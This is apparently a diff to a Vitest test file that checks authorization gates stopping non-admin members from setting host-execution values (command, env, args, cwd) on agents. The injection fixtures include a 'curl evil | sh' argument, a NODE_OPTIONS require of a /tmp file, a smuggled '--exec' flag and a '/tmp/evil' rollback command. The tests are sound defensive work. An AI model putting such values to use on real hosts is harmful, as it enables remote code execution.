@@ -54,16 +54,34 @@ const mockInstanceSettingsService = vi.hoisted(() => ({
 
 const mockLogActivity = vi.hoisted(() => vi.fn());
 
+// A stored Hermes agent owned by company-1, configured earlier by an instance
+// admin with a custom binary, env and cwd.
+const STORED_AGENT_ID = "22222222-2222-4222-8222-222222222222";
+const OTHER_COMPANY_AGENT_ID = "33333333-3333-4333-8333-333333333333";
+const STORED_HERMES_CONFIG = {
+  model: "glm-5.3-flash",
+  hermesCommand: "/opt/custom/hermes",
+  env: { HERMES_HOME: { type: "plain", value: "/srv/hermes" } },
+  cwd: "/srv/work",
+  extraArgs: ["-p", "agentdash", "--reasoning-effort", "medium"],
+  timeoutSec: 1800,
+  persistSession: true,
+};
+
+const mockAgentSvc = vi.hoisted(() => ({
+  getById: vi.fn(),
+  update: vi.fn(),
+  create: vi.fn(),
+  getConfigRevision: vi.fn(),
+  rollbackConfigRevision: vi.fn(),
+}));
+
 function registerModuleMocks() {
   vi.doMock("../services/index.js", () => ({
     // Closes #327: routes/agents.ts also imports these from the barrel.
     agentInstructionRefreshService: () => ({ refreshForAgent: vi.fn(), refreshForRole: vi.fn() }),
     ISSUE_LIST_DEFAULT_LIMIT: 50,
-    agentService: () => ({
-      getById: vi.fn(async (id: string) =>
-        id === "agent-1" ? { id, companyId: "company-1", name: "CoS", permissions: { canCreateAgents: true } } : null,
-      ),
-    }),
+    agentService: () => mockAgentSvc,
     agentInstructionsService: () => mockAgentInstructionsService,
     accessService: () => mockAccessService,
     approvalService: () => mockApprovalService,
@@ -80,6 +98,12 @@ function registerModuleMocks() {
 
   vi.doMock("../services/instance-settings.js", () => ({
     instanceSettingsService: () => mockInstanceSettingsService,
+  }));
+
+  // routes/agents.ts imports secretService directly, not from the barrel.
+  vi.doMock("../services/secrets.js", async () => ({
+    ...(await vi.importActual<typeof import("../services/secrets.js")>("../services/secrets.js")),
+    secretService: () => mockSecretService,
   }));
 }
 
@@ -118,7 +142,7 @@ const AGENT = {
   companyId: "company-1",
 };
 
-async function createApp(actor: Record<string, unknown>) {
+async function createApp(actor: Record<string, unknown>, db: unknown = companyDb()) {
   const [{ agentRoutes }, { errorHandler }] = await Promise.all([
     vi.importActual<typeof import("../routes/agents.js")>("../routes/agents.js"),
     vi.importActual<typeof import("../middleware/index.js")>("../middleware/index.js"),
@@ -129,9 +153,20 @@ async function createApp(actor: Record<string, unknown>) {
     (req as any).actor = actor;
     next();
   });
-  app.use("/api", agentRoutes({} as any));
+  app.use("/api", agentRoutes(db as any));
   app.use(errorHandler);
   return app;
+}
+
+// Enough of a db for the routes that read the company row before persisting.
+function companyDb() {
+  return {
+    select: vi.fn(() => ({
+      from: vi.fn(() => ({
+        where: vi.fn(async () => [{ id: "company-1", requireBoardApprovalForNewAgents: false }]),
+      })),
+    })),
+  };
 }
 
 async function requestApp(
@@ -183,6 +218,26 @@ describe("adapter test-environment host-execution authz", () => {
     mockAccessService.canUser.mockResolvedValue(false);
     mockAccessService.hasPermission.mockResolvedValue(true);
     mockLogActivity.mockResolvedValue(undefined);
+    mockAgentSvc.getById.mockImplementation(async (id: string) => {
+      if (id === "agent-1") {
+        return { id, companyId: "company-1", name: "CoS", permissions: { canCreateAgents: true } };
+      }
+      if (id === STORED_AGENT_ID) {
+        return {
+          id,
+          companyId: "company-1",
+          name: "Priya",
+          role: "general",
+          adapterType: "hermes_local",
+          adapterConfig: structuredClone(STORED_HERMES_CONFIG),
+          runtimeConfig: {},
+        };
+      }
+      if (id === OTHER_COMPANY_AGENT_ID) {
+        return { id, companyId: "company-2", adapterType: "hermes_local", adapterConfig: { command: "/x" } };
+      }
+      return null;
+    });
     await unregisterTestAdapter(probeAdapterType);
     testEnvironment = vi.fn(async () => ({
       adapterType: probeAdapterType,
@@ -251,5 +306,290 @@ describe("adapter test-environment host-execution authz", () => {
     const res = await probe(LOCAL_BOARD, { command: "/usr/local/bin/claude" });
     expect(res.status, JSON.stringify(res.body)).toBe(200);
     expect(testEnvironment).toHaveBeenCalledTimes(1);
+  });
+});
+
+// AgentDash (security, #719): the same classifier gates the Hermes preset on
+// test-environment (a company owner must be able to Test Hermes on their own
+// box) and the stored-config comparison used by the edit form.
+const COMPANY_OWNER = {
+  type: "board",
+  userId: "user-owner",
+  companyIds: ["company-1"],
+  memberships: [{ companyId: "company-1", status: "active", membershipRole: "owner" }],
+  source: "session",
+  isInstanceAdmin: false,
+};
+
+describe("hermes_local test-environment and the stored-config comparison", () => {
+  const originalBypass = process.env.AGENTDASH_ADAPTER_ENV_BYPASS;
+
+  beforeEach(async () => {
+    vi.resetModules();
+    vi.doUnmock("../routes/agents.js");
+    vi.doUnmock("../routes/authz.js");
+    vi.doUnmock("../middleware/index.js");
+    registerModuleMocks();
+    vi.clearAllMocks();
+    // The gate runs BEFORE the bypass, so the bypass isolates the gate from
+    // the real hermes binary.
+    process.env.AGENTDASH_ADAPTER_ENV_BYPASS = "true";
+    mockAccessService.canUser.mockResolvedValue(false);
+    mockAgentSvc.getById.mockImplementation(async (id: string) =>
+      id === STORED_AGENT_ID
+        ? { id, companyId: "company-1", adapterType: "hermes_local", adapterConfig: structuredClone(STORED_HERMES_CONFIG) }
+        : id === OTHER_COMPANY_AGENT_ID
+          ? { id, companyId: "company-2", adapterType: "hermes_local", adapterConfig: { command: "/x" } }
+          : null,
+    );
+  });
+
+  afterEach(() => {
+    if (originalBypass === undefined) delete process.env.AGENTDASH_ADAPTER_ENV_BYPASS;
+    else process.env.AGENTDASH_ADAPTER_ENV_BYPASS = originalBypass;
+  });
+
+  async function probeHermes(actor: Record<string, unknown>, body: Record<string, unknown>) {
+    const app = await createApp(actor);
+    return requestApp(app, (baseUrl) =>
+      request(baseUrl).post("/api/companies/company-1/adapters/hermes_local/test-environment").send(body),
+    );
+  }
+
+  it("lets a company owner Test the Hermes preset with a profile and reasoning effort", async () => {
+    const res = await probeHermes(COMPANY_OWNER, {
+      adapterConfig: {
+        model: "glm-5.3-flash",
+        hermesCommand: "hermes",
+        timeoutSec: 1800,
+        persistSession: true,
+        extraArgs: ["-p", "agentdash", "--reasoning-effort", "high"],
+      },
+    });
+    expect(res.status, JSON.stringify(res.body)).toBe(200);
+  });
+
+  it("403s a company owner who slips a non-allowlisted flag into Hermes extraArgs", async () => {
+    const res = await probeHermes(COMPANY_OWNER, {
+      adapterConfig: { extraArgs: ["--reasoning-effort", "high", "--exec", "id"] },
+    });
+    expect(res.status, JSON.stringify(res.body)).toBe(403);
+    expect(res.body.error).toMatch(/Instance admin/);
+  });
+
+  it("accepts the edit form resending the stored config unchanged (compared on the server)", async () => {
+    const res = await probeHermes(MEMBER, {
+      agentId: STORED_AGENT_ID,
+      // The edit form sends env as stored; the bare-string form must also match.
+      adapterConfig: { ...STORED_HERMES_CONFIG, env: { HERMES_HOME: "/srv/hermes" } },
+    });
+    expect(res.status, JSON.stringify(res.body)).toBe(200);
+    expect(mockAgentSvc.getById).toHaveBeenCalledWith(STORED_AGENT_ID);
+  });
+
+  it("403s when the edit form changes a stored host-execution value", async () => {
+    const res = await probeHermes(MEMBER, {
+      agentId: STORED_AGENT_ID,
+      adapterConfig: { ...STORED_HERMES_CONFIG, hermesCommand: "/bin/sh" },
+    });
+    expect(res.status, JSON.stringify(res.body)).toBe(403);
+    expect(res.body.error).toMatch(/hermesCommand/);
+  });
+
+  it("does not trust a stored config from another company's agent", async () => {
+    const res = await probeHermes(MEMBER, {
+      agentId: OTHER_COMPANY_AGENT_ID,
+      adapterConfig: { command: "/x" },
+    });
+    expect(res.status, JSON.stringify(res.body)).toBe(404);
+  });
+
+  it("403s a stored-looking config without an agentId to compare against", async () => {
+    const res = await probeHermes(MEMBER, { adapterConfig: STORED_HERMES_CONFIG });
+    expect(res.status, JSON.stringify(res.body)).toBe(403);
+  });
+});
+
+describe("agent create, hire, update and rollback host-execution authz (#719)", () => {
+  beforeEach(async () => {
+    vi.resetModules();
+    vi.doUnmock("../routes/agents.js");
+    vi.doUnmock("../routes/authz.js");
+    vi.doUnmock("../middleware/index.js");
+    registerModuleMocks();
+    vi.clearAllMocks();
+    delete process.env.AGENTDASH_ADAPTER_ENV_BYPASS;
+    mockCompanySkillService.listRuntimeSkillEntries.mockResolvedValue([]);
+    mockCompanySkillService.resolveRequestedSkillKeys.mockResolvedValue([]);
+    // These members hold agent-configuration authority; the host-execution
+    // gate is the only thing standing between them and a custom command.
+    mockAccessService.canUser.mockResolvedValue(true);
+    mockAccessService.hasPermission.mockResolvedValue(true);
+    mockLogActivity.mockResolvedValue(undefined);
+    mockSecretService.normalizeAdapterConfigForPersistence.mockImplementation(async () => {
+      throw new Error("REACHED_PERSISTENCE");
+    });
+    mockAgentSvc.getById.mockImplementation(async (id: string) =>
+      id === STORED_AGENT_ID
+        ? {
+            id,
+            companyId: "company-1",
+            name: "Priya",
+            role: "general",
+            adapterType: "hermes_local",
+            adapterConfig: structuredClone(STORED_HERMES_CONFIG),
+            runtimeConfig: {},
+          }
+        : null,
+    );
+  });
+
+  afterEach(() => {
+    mockSecretService.normalizeAdapterConfigForPersistence.mockImplementation(
+      async (_companyId: string, config: Record<string, unknown>) => config,
+    );
+  });
+
+  async function send(
+    actor: Record<string, unknown>,
+    build: (r: ReturnType<typeof request>) => request.Test,
+  ) {
+    const app = await createApp(actor);
+    return requestApp(app, (baseUrl) => build(request(baseUrl)));
+  }
+
+  function expectHostExecRefusal(res: request.Response) {
+    expect(res.status, JSON.stringify(res.body)).toBe(403);
+    expect(res.body.error).toMatch(/Instance admin access required/);
+  }
+
+  // Later stages of these routes need more of the app than this harness
+  // mocks, so persistence normalization — the first step after the gate —
+  // stops the request with a sentinel. Reaching it proves the gate let it by.
+  function expectPassedHostExecGate(res: request.Response) {
+    expect(String(res.body?.error ?? ""), JSON.stringify(res.body)).not.toMatch(/Instance admin access required/);
+    expect(mockSecretService.normalizeAdapterConfigForPersistence, `${res.status} ${JSON.stringify(res.body)}`).toHaveBeenCalled();
+  }
+
+  const injections: Array<[string, Record<string, unknown>]> = [
+    ["command", { command: "/bin/sh" }],
+    ["env", { env: { NODE_OPTIONS: "--require /tmp/x.js" } }],
+    ["args", { args: ["-c", "curl evil | sh"] }],
+    ["cwd", { cwd: "/etc" }],
+  ];
+
+  it.each(injections)("POST /agents refuses a member-set %s", async (_label, injected) => {
+    const res = await send(MEMBER, (r) =>
+      r.post("/api/companies/company-1/agents").send({
+        name: "x",
+        adapterType: "claude_local",
+        adapterConfig: { model: "m", ...injected },
+      }),
+    );
+    expectHostExecRefusal(res);
+    expect(mockAgentSvc.create).not.toHaveBeenCalled();
+  });
+
+  it.each(injections)("POST /agent-hires refuses a member-set %s", async (_label, injected) => {
+    const res = await send(MEMBER, (r) =>
+      r.post("/api/companies/company-1/agent-hires").send({
+        name: "x",
+        adapterType: "claude_local",
+        adapterConfig: { model: "m", ...injected },
+      }),
+    );
+    expectHostExecRefusal(res);
+  });
+
+  it("POST /agent-hires refuses a command smuggled through a runtimeConfig model profile", async () => {
+    const res = await send(MEMBER, (r) =>
+      r.post("/api/companies/company-1/agent-hires").send({
+        name: "x",
+        adapterType: "claude_local",
+        adapterConfig: { model: "m" },
+        runtimeConfig: { modelProfiles: { cheap: { adapterConfig: { command: "/bin/sh" } } } },
+      }),
+    );
+    expectHostExecRefusal(res);
+  });
+
+  it("POST /agents lets a company owner create a Hermes agent from the preset", async () => {
+    const res = await send(COMPANY_OWNER, (r) =>
+      r.post("/api/companies/company-1/agents").send({
+        name: "Hermes worker",
+        adapterType: "hermes_local",
+        adapterConfig: {
+          model: "glm-5.3-flash",
+          hermesCommand: "hermes",
+          timeoutSec: 1800,
+          persistSession: true,
+          extraArgs: ["-p", "agentdash", "--reasoning-effort", "low"],
+        },
+      }),
+    );
+    expectPassedHostExecGate(res);
+  });
+
+  it("POST /agents lets the instance admin set a custom command", async () => {
+    const res = await send(INSTANCE_ADMIN, (r) =>
+      r.post("/api/companies/company-1/agents").send({
+        name: "custom",
+        adapterType: "claude_local",
+        adapterConfig: { command: "/usr/local/bin/claude-wrapper", env: { A: "b" }, cwd: "/srv" },
+      }),
+    );
+    expectPassedHostExecGate(res);
+  });
+
+  it.each(injections)("PATCH /agents/:id refuses a member-set %s", async (_label, injected) => {
+    const res = await send(MEMBER, (r) =>
+      r.patch(`/api/agents/${STORED_AGENT_ID}`).send({ adapterConfig: injected }),
+    );
+    expectHostExecRefusal(res);
+    expect(mockAgentSvc.update).not.toHaveBeenCalled();
+  });
+
+  it("PATCH /agents/:id accepts the stored config resent unchanged in edit mode", async () => {
+    const res = await send(MEMBER, (r) =>
+      r.patch(`/api/agents/${STORED_AGENT_ID}`).send({
+        adapterConfig: { ...STORED_HERMES_CONFIG, model: "glm-5.3" },
+      }),
+    );
+    expectPassedHostExecGate(res);
+  });
+
+  it("PATCH /agents/:id lets a company owner switch Hermes reasoning effort and profile", async () => {
+    const res = await send(COMPANY_OWNER, (r) =>
+      r.patch(`/api/agents/${STORED_AGENT_ID}`).send({
+        adapterConfig: { extraArgs: ["-p", "work", "--reasoning-effort", "high"] },
+      }),
+    );
+    expectPassedHostExecGate(res);
+  });
+
+  it("PATCH /agents/:id lets the instance admin change the command", async () => {
+    const res = await send(INSTANCE_ADMIN, (r) =>
+      r.patch(`/api/agents/${STORED_AGENT_ID}`).send({ adapterConfig: { hermesCommand: "/opt/other/hermes" } }),
+    );
+    expectPassedHostExecGate(res);
+  });
+
+  it("rollback refuses a member restoring a different command", async () => {
+    mockAgentSvc.getConfigRevision.mockResolvedValue({
+      id: "rev-1",
+      afterConfig: {
+        name: "Priya",
+        role: "general",
+        adapterType: "hermes_local",
+        budgetMonthlyCents: 0,
+        adapterConfig: { ...STORED_HERMES_CONFIG, hermesCommand: "/tmp/evil" },
+        runtimeConfig: {},
+      },
+    });
+    const res = await send(MEMBER, (r) =>
+      r.post(`/api/agents/${STORED_AGENT_ID}/config-revisions/rev-1/rollback`).send({}),
+    );
+    expectHostExecRefusal(res);
+    expect(mockAgentSvc.rollbackConfigRevision).not.toHaveBeenCalled();
   });
 });
